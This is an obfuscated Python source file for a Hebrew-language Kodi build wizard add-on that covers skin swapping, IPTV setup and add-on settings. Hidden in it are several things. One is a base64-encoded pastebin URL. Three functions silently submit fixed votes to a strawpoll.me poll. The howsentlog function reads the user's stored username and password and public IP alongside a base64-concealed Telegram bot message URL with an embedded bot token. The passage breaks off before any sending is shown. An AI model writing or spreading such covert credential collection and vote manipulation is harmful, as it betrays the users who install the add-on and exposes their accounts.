# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:252
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:253
def MainMenu ():#line:260
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:262
def skinWIN ():#line:263
	idle ()#line:264
	O00000O00OO0OO0OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:265
	O0OO0OOO00000O0O0 =[];OOOO0O00OO0O00O00 =[]#line:266
	for OO0OOOO00000OO0OO in sorted (O00000O00OO0OO0OO ,key =lambda O00OO00OOOOO0000O :O00OO00OOOOO0000O ):#line:267
		O000O0O00O0000O0O =os .path .split (OO0OOOO00000OO0OO [:-1 ])[1 ]#line:268
		O00O0OOOOO0OOOO0O =os .path .join (OO0OOOO00000OO0OO ,'addon.xml')#line:269
		if os .path .exists (O00O0OOOOO0OOOO0O ):#line:270
			O000OO0OOO0OO00O0 =open (O00O0OOOOO0OOOO0O )#line:271
			OOO00OOO000OOO0OO =O000OO0OOO0OO00O0 .read ()#line:272
			OO0OOO0OO00OOOOOO =parseDOM2 (OOO00OOO000OOO0OO ,'addon',ret ='id')#line:273
			O00OOO0O0OOO0O0O0 =O000O0O00O0000O0O if len (OO0OOO0OO00OOOOOO )==0 else OO0OOO0OO00OOOOOO [0 ]#line:274
			try :#line:275
				O0O0O0O00O00OOO00 =xbmcaddon .Addon (id =O00OOO0O0OOO0O0O0 )#line:276
				O0OO0OOO00000O0O0 .append (O0O0O0O00O00OOO00 .getAddonInfo ('name'))#line:277
				OOOO0O00OO0O00O00 .append (O00OOO0O0OOO0O0O0 )#line:278
			except :#line:279
				pass #line:280
	O00O000O0O0OOOOOO =[];O0OOOOOOO0OOO000O =0 #line:281
	OOO0OOO000OO0O0O0 =["Current Skin -- %s"%currSkin ()]+O0OO0OOO00000O0O0 #line:282
	O0OOOOOOO0OOO000O =DIALOG .select ("Select the Skin you want to swap with.",OOO0OOO000OO0O0O0 )#line:283
	if O0OOOOOOO0OOO000O ==-1 :return #line:284
	else :#line:285
		OOOO0O0O0O0OOOO00 =(O0OOOOOOO0OOO000O -1 )#line:286
		O00O000O0O0OOOOOO .append (OOOO0O0O0O0OOOO00 )#line:287
		OOO0OOO000OO0O0O0 [O0OOOOOOO0OOO000O ]="%s"%(O0OO0OOO00000O0O0 [OOOO0O0O0O0OOOO00 ])#line:288
	if O00O000O0O0OOOOOO ==None :return #line:289
	for O0OO00OO00OO000OO in O00O000O0O0OOOOOO :#line:290
		swapSkins (OOOO0O00OO0O00O00 [O0OO00OO00OO000OO ])#line:291
def currSkin ():#line:293
	return xbmc .getSkinDir ('Container.PluginName')#line:294
def swapSkins (O00OOOOOOOOO0O0O0 ,title ="Error"):#line:295
	O0OO00O00OOO0O0O0 ='lookandfeel.skin'#line:296
	O00OOOOO000OOO0OO =O00OOOOOOOOO0O0O0 #line:297
	OO0OOO0OOO000000O =getOld (O0OO00O00OOO0O0O0 )#line:298
	O00000000OOOOO0O0 =O0OO00O00OOO0O0O0 #line:299
	setNew (O00000000OOOOO0O0 ,O00OOOOO000OOO0OO )#line:300
	O0OO000OO00O0000O =0 #line:301
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO000OO00O0000O <100 :#line:302
		O0OO000OO00O0000O +=1 #line:303
		xbmc .sleep (1 )#line:304
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:305
		xbmc .executebuiltin ('SendClick(11)')#line:306
	return True #line:307
def getOld (O0000OO00O0OO00OO ):#line:309
	try :#line:310
		O0000OO00O0OO00OO ='"%s"'%O0000OO00O0OO00OO #line:311
		O0OOOOOO0OOOOOO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0000OO00O0OO00OO )#line:312
		OOOO0000OO0000O0O =xbmc .executeJSONRPC (O0OOOOOO0OOOOOO0O )#line:314
		OOOO0000OO0000O0O =simplejson .loads (OOOO0000OO0000O0O )#line:315
		if OOOO0000OO0000O0O .has_key ('result'):#line:316
			if OOOO0000OO0000O0O ['result'].has_key ('value'):#line:317
				return OOOO0000OO0000O0O ['result']['value']#line:318
	except :#line:319
		pass #line:320
	return None #line:321
def setNew (OO0O0O0O0O0OO000O ,OO000O0O0O00OO0O0 ):#line:324
	try :#line:325
		OO0O0O0O0O0OO000O ='"%s"'%OO0O0O0O0O0OO000O #line:326
		OO000O0O0O00OO0O0 ='"%s"'%OO000O0O0O00OO0O0 #line:327
		O0000000O00OO0O00 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0O0O0O0O0OO000O ,OO000O0O0O00OO0O0 )#line:328
		O0OOO00000OO0O00O =xbmc .executeJSONRPC (O0000000O00OO0O00 )#line:330
	except :#line:331
		pass #line:332
	return None #line:333
def idle ():#line:334
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:335
def resetkodi ():#line:337
		if xbmc .getCondVisibility ('system.platform.windows'):#line:338
			O0OOOOOOOO0OO0OOO =xbmcgui .DialogProgress ()#line:339
			O0OOOOOOOO0OO0OOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:342
			O0OOOOOOOO0OO0OOO .update (0 )#line:343
			for O0OO000O00OO00O00 in range (5 ,-1 ,-1 ):#line:344
				time .sleep (1 )#line:345
				O0OOOOOOOO0OO0OOO .update (int ((5 -O0OO000O00OO00O00 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OO000O00OO00O00 ),'')#line:346
				if O0OOOOOOOO0OO0OOO .iscanceled ():#line:347
					from resources .libs import win #line:348
					return None ,None #line:349
			from resources .libs import win #line:350
		else :#line:351
			O0OOOOOOOO0OO0OOO =xbmcgui .DialogProgress ()#line:352
			O0OOOOOOOO0OO0OOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:355
			O0OOOOOOOO0OO0OOO .update (0 )#line:356
			for O0OO000O00OO00O00 in range (5 ,-1 ,-1 ):#line:357
				time .sleep (1 )#line:358
				O0OOOOOOOO0OO0OOO .update (int ((5 -O0OO000O00OO00O00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OO000O00OO00O00 ),'')#line:359
				if O0OOOOOOOO0OO0OOO .iscanceled ():#line:360
					os ._exit (1 )#line:361
					return None ,None #line:362
			os ._exit (1 )#line:363
def backtokodi ():#line:365
			wiz .kodi17Fix ()#line:366
			fix18update ()#line:367
			fix17update ()#line:368
def testcommand1 ():#line:370
    import requests #line:371
    O0O00OO000000O000 ='18773068'#line:372
    OO000OO000O0O00OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O00OO000000O000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:384
    OO00O0OOOOOOOOOOO ='145273320'#line:386
    OOO0OOO0O00O000OO ='145272688'#line:387
    if ADDON .getSetting ("auto_rd")=='true':#line:388
        OO0O000000OO00000 =OO00O0OOOOOOOOOOO #line:389
    else :#line:390
        OO0O000000OO00000 =OOO0OOO0O00O000OO #line:391
    OOOO0O000OOOO00OO ={'options':OO0O000000OO00000 }#line:395
    O0O00O00000OOO00O =requests .post ('https://www.strawpoll.me/'+O0O00OO000000O000 ,headers =OO000OO000O0O00OO ,data =OOOO0O000OOOO00OO )#line:397
def builde_Votes ():#line:398
   try :#line:399
        import requests #line:400
        OOOOOOOOOO0000OO0 ='18773068'#line:401
        OOOOOOOOOO0O0OOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOOOOOOOO0000OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:413
        O0OO00OO00OOOOOOO ='145273320'#line:415
        O00O00OO00O0OO0OO ={'options':O0OO00OO00OOOOOOO }#line:421
        OO0O00O0OO00O000O =requests .post ('https://www.strawpoll.me/'+OOOOOOOOOO0000OO0 ,headers =OOOOOOOOOO0O0OOO0 ,data =O00O00OO00O0OO0OO )#line:423
   except :pass #line:424
def update_Votes ():#line:425
   try :#line:426
        import requests #line:427
        O00OOO0000000OO0O ='18773068'#line:428
        OO0000O0O000OO00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OOO0000000OO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:440
        O0OOOO0OO0000OO00 ='145273321'#line:442
        O0OO0000O0OO0OO0O ={'options':O0OOOO0OO0000OO00 }#line:448
        O00OO00000O000O00 =requests .post ('https://www.strawpoll.me/'+O00OOO0000000OO0O ,headers =OO0000O0O000OO00O ,data =O0OO0000O0OO0OO0O )#line:450
   except :pass #line:451
def testcommand ():#line:455
    setautorealdebrid ()#line:456
def skin_homeselect ():#line:457
	try :#line:459
		O00O000OOO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:460
		O0000O00O0OOO00O0 =open (O00O000OOO0O00OO0 ,'r')#line:462
		OO000OO0OO00OOOOO =O0000O00O0OOO00O0 .read ()#line:463
		O0000O00O0OOO00O0 .close ()#line:464
		OOOOOO00O0O0OO0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:465
		OOO00000O000O0OOO =re .compile (OOOOOO00O0O0OO0O0 ).findall (OO000OO0OO00OOOOO )[0 ]#line:466
		O0000O00O0OOO00O0 =open (O00O000OOO0O00OO0 ,'w')#line:467
		O0000O00O0OOO00O0 .write (OO000OO0OO00OOOOO .replace ('<setting id="HomeS" type="string%s/setting>'%OOO00000O000O0OOO ,'<setting id="HomeS" type="string"></setting>'))#line:468
		O0000O00O0OOO00O0 .close ()#line:469
	except :#line:470
		pass #line:471
def autotrakt ():#line:474
    OO0OOO00OO0O000OO =(ADDON .getSetting ("auto_trk"))#line:475
    if OO0OOO00OO0O000OO =='true':#line:476
       from resources .libs import trk_aut #line:477
def traktsync ():#line:479
     OOOOOO000O0O0OO00 =(ADDON .getSetting ("auto_trk"))#line:480
     if OOOOOO000O0O0OO00 =='true':#line:481
       from resources .libs import trk_aut #line:484
     else :#line:485
        ADDON .openSettings ()#line:486
def imdb_synck ():#line:488
   try :#line:489
     OOO0O000OO00OOO0O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:490
     OO0O00O00OO00OOO0 =xbmcaddon .Addon ('plugin.video.gaia')#line:491
     O00O000O0000OOO00 =(ADDON .getSetting ("imdb_sync"))#line:492
     OO0OOO0OO0000OOO0 ="imdb.user"#line:493
     OO00OOO0OO0O00O0O ="accounts.informants.imdb.user"#line:494
     OOO0O000OO00OOO0O .setSetting (OO0OOO0OO0000OOO0 ,str (O00O000O0000OOO00 ))#line:495
     OO0O00O00OO00OOO0 .setSetting ('accounts.informants.imdb.enabled','true')#line:496
     OO0O00O00OO00OOO0 .setSetting (OO00OOO0OO0O00O0O ,str (O00O000O0000OOO00 ))#line:497
   except :pass #line:498
def dis_or_enable_addon (OO0OO00O00O0OO0O0 ,O000000O00O0O0OO0 ,enable ="true"):#line:500
    import json #line:501
    OO0OOO000OO0O0O00 ='"%s"'%OO0OO00O00O0OO0O0 #line:502
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO00O00O0OO0O0 )and enable =="true":#line:503
        logging .warning ('already Enabled')#line:504
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0OO00O00O0OO0O0 )#line:505
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO00O00O0OO0O0 )and enable =="false":#line:506
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0OO00O00O0OO0O0 )#line:507
    else :#line:508
        O0000OOOOO0OOO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OOO000OO0O0O00 ,enable )#line:509
        OOOO0OOO0O0OOOOOO =xbmc .executeJSONRPC (O0000OOOOO0OOO000 )#line:510
        OOO00OO000O0OO000 =json .loads (OOOO0OOO0O0OOOOOO )#line:511
        if enable =="true":#line:512
            xbmc .log ("### Enabled %s, response = %s"%(OO0OO00O00O0OO0O0 ,OOO00OO000O0OO000 ))#line:513
        else :#line:514
            xbmc .log ("### Disabled %s, response = %s"%(OO0OO00O00O0OO0O0 ,OOO00OO000O0OO000 ))#line:515
    if O000000O00O0O0OO0 =='auto':#line:516
     return True #line:517
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:518
def iptvset ():#line:521
  try :#line:522
    O0O0000O0O00000OO =(ADDON .getSetting ("iptv_on"))#line:523
    if O0O0000O0O00000OO =='true':#line:525
       if KODIV >=17 and KODIV <18 :#line:527
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:528
         OO000000OO00000OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:529
         O0OOOO000O0000O00 =(ADDON .getSetting ("iptvUrl"))#line:531
         OO000000OO00000OO .setSetting ('m3uUrl',O0OOOO000O0000O00 )#line:532
         OO0OO0OO000OOOOOO =(ADDON .getSetting ("epg_Url"))#line:533
         OO000000OO00000OO .setSetting ('epgUrl',OO0OO0OO000OOOOOO )#line:534
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:537
         iptvsimpldownpc ()#line:538
         wiz .kodi17Fix ()#line:539
         xbmc .sleep (1000 )#line:540
         OO000000OO00000OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:541
         O0OOOO000O0000O00 =(ADDON .getSetting ("iptvUrl"))#line:542
         OO000000OO00000OO .setSetting ('m3uUrl',O0OOOO000O0000O00 )#line:543
         OO0OO0OO000OOOOOO =(ADDON .getSetting ("epg_Url"))#line:544
         OO000000OO00000OO .setSetting ('epgUrl',OO0OO0OO000OOOOOO )#line:545
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:547
         iptvsimpldown ()#line:548
         wiz .kodi17Fix ()#line:549
         xbmc .sleep (1000 )#line:550
         OO000000OO00000OO =xbmcaddon .Addon ('pvr.iptvsimple')#line:551
         O0OOOO000O0000O00 =(ADDON .getSetting ("iptvUrl"))#line:552
         OO000000OO00000OO .setSetting ('m3uUrl',O0OOOO000O0000O00 )#line:553
         OO0OO0OO000OOOOOO =(ADDON .getSetting ("epg_Url"))#line:554
         OO000000OO00000OO .setSetting ('epgUrl',OO0OO0OO000OOOOOO )#line:555
  except :pass #line:556
def howsentlog ():#line:563
       try :#line:564
          import json #line:565
          OOO0OO000O0O0O0O0 =(ADDON .getSetting ("user"))#line:566
          O0O0OOO0OO0O00OO0 =(ADDON .getSetting ("pass"))#line:567
          OOO000O00O0OOO00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:568
          OO000OO00O0O0OOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:570
          OO0O0OOOO000OO000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:571
          O0O00O0OO0OO00O0O =str (json .loads (OO0O0OOOO000OO000 )['ip'])#line:572
          OOOOO0O0O000O0OOO =OOO0OO000O0O0O0O0 #line:573
          OO0O0O0OOOO00OO0O =O0O0OOO0OO0O00OO0 #line:574
          import socket #line:576
